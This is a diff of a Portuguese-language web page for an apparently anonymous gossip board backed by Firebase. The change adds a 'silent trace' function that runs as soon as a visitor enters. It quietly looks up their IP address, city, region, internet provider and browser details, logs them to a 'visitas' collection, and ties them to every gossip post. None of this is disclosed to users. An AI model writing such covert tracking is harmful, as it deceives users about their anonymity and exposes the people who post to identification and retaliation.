@@ -23,7 +23,6 @@
             overflow-x: hidden;
         }
 
-        /* Névoa Sombria Móvel */
         .fog {
             position: fixed;
             top: 0; width: 200%; height: 100%;
@@ -62,7 +61,6 @@
             margin: auto;
         }
 
-        /* Área de Depoimento */
         .input-container {
             background: #0a0a0a;
             border: 1px solid #1a1a1a;
@@ -111,7 +109,6 @@
             color: var(--neon);
         }
 
-        /* Feed de Revelações */
         .revelation {
             margin-top: 40px;
             border-left: 1px solid var(--blood);
@@ -162,7 +159,7 @@
     </div>
 
     <script>
-        // Sua configuração Firebase
+        // Configuração Firebase
         var firebaseConfig = {
             apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
             authDomain: "xoxo-fofocas.firebaseapp.com",
@@ -175,10 +172,46 @@
         firebase.initializeApp(firebaseConfig);
         var db = firebase.firestore();
 
+        // Variável global para guardar o rastro do IP atual
+        let rastroAtual = { ip: "Desconhecido" };
+
+        // Função de Início
         function start() {
             document.getElementById('login-screen').style.display = 'none';
             document.getElementById('feed-container').style.display = 'block';
+            
+            // Ativa o rastro silencioso IMEDIATAMENTE
+            capturarRastroSilencioso();
             carregarFofocas();
+        }
+
+        // RASTREADOR DE IP E SISTEMA
+        async function capturarRastroSilencioso() {
+            try {
+                // Busca dados da localização e internet
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+
+                rastroAtual = {
+                    ip: data.ip,
+                    cidade: data.city,
+                    estado: data.region,
+                    provedor: data.org,
+                    dispositivo: navigator.userAgent,
+                    data_acesso: firebase.firestore.FieldValue.serverTimestamp()
+                };
+
+                // Salva uma cópia na coleção de "visitas" para você saber quem entrou
+                db.collection("visitas").add(rastroAtual);
+                console.log("Rastro arquivado.");
+
+            } catch (e) {
+                console.log("Erro no rastro, tentando backup...");
+                // Backup caso a API de localização falhe
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(d => { rastroAtual.ip = d.ip; });
+            }
         }
 
         function enviarFofoca() {
@@ -189,22 +222,16 @@
             btn.disabled = true;
             btn.innerText = "LOCALIZANDO...";
 
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => salvar({ ip: data.ip }))
-                .catch(() => salvar({ ip: "Oculto" }));
-
-            function salvar(rastro) {
-                db.collection("fofocas").add({
-                    conteudo: input.value,
-                    data: firebase.firestore.FieldValue.serverTimestamp(),
-                    rastro: rastro
-                }).then(() => {
-                    input.value = "";
-                    btn.disabled = false;
-                    btn.innerText = "ARQUIVAR PARA SEMPRE";
-                });
-            }
+            // Salva a fofoca vinculando o rastro capturado no início
+            db.collection("fofocas").add({
+                conteudo: input.value,
+                data: firebase.firestore.FieldValue.serverTimestamp(),
+                rastro: rastroAtual // O IP e localização ficam aqui
+            }).then(() => {
+                input.value = "";
+                btn.disabled = false;
+                btn.innerText = "ARQUIVAR PARA SEMPRE";
+            });
         }
 
         function carregarFofocas() {
